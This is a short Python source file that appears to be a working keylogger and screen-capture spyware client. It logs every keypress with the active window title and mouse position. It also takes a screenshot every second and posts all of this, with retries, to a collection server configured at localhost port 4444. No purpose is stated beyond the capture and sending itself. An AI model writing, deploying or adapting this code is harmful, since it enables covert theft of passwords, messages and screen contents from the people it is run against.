from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from datetime import datetime
from pynput import keyboard
from io import BytesIO

import pygetwindow
import threading
import pyautogui
import requests
import base64
import time


url = 'http://127.0.0.1:4444/info'


def send_data(data: dict):
    adapter = HTTPAdapter(max_retries=Retry(connect=10, backoff_factor=0.5))
    session = requests.Session()
    
    session.mount('http://', adapter)
    session.post(url, data=data)
    
    
def get_m_position() -> str:
    m_x, m_y = pyautogui.position()
    
    return f'{m_x:>4} {m_y:>4}'


def getMouse():
    def get_screenshot() -> bytes:
        screenshot = pyautogui.screenshot()
        output     = BytesIO()
        
        screenshot.save(output, format='PNG')
        
        return base64.b64encode(output.getvalue())
    
    while True:
        send_data({
            'time':       str(datetime.now()),
            'm_position': get_m_position(),
            'screenshot': get_screenshot(),
        })
        
        time.sleep(1)
        
        
def on_press(key):
    key_str: str

    try:                   key_str = key.char
    except AttributeError: key_str = key.name

    send_data({
        'time':       str(datetime.now()),
        'm_position': get_m_position(),
        'active_win': pygetwindow.getActiveWindow().title,
        'key':        key_str,
    })


if __name__ == '__main__':
    threading.Thread(target=getMouse, args=()).start()
    
    with keyboard.Listener(on_press=on_press, on_release=None) as listener:
        listener.join()